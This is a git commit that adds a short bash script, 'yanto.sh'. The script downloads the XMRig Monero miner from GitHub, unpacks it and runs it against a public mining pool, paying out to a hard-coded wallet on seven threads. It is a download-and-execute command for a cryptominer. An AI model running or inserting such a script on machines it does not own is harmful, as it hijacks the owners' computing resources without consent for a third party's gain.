346063d3e50e2299e8e3682482734c7bde6db9a4
celinjaya <108304676+celinjaya@users.noreply.github.com>
2022-06-28 04:16:47 +0700

    Create yanto.sh

---
+++ yanto.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-x64.tar.gz
+tar -xvf xmrig-6.16.2-linux-x64.tar.gz
+cd xmrig-6.16.2
+./xmrig -o us-west.minexmr.com:443 -u 89yPiu3D6mRMehmcaZtafeK82ZBcNMH2JK73PRTcb6L6EtPYg8Wi3Rybtw9mdsi5ehY7Jmy2jwMJjSCFa9Dvs3P9TY2h2z9 -k --tls --rig-id Ucok -t 7
